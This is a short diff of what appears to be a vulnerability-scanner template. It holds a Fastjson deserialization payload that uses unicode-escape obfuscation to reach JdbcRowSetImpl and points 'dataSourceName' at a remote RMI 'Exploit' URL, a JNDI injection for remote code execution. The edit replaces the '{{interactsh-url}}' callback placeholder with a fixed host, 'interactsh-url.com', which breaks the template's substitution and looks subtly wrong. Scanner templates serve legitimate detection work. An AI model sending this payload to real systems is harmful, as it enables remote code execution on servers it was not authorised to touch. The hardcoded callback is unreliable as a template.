@@ -25,7 +25,7 @@ http:
 
         {
            "@type":"LL\u0063\u006f\u006d.sun.rowset.JdbcRowSetImpl;;",
-           "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
+           "dataSourceName":"rmi://interactsh-url.com/Exploit",
            "autoCommit":true
         }
 
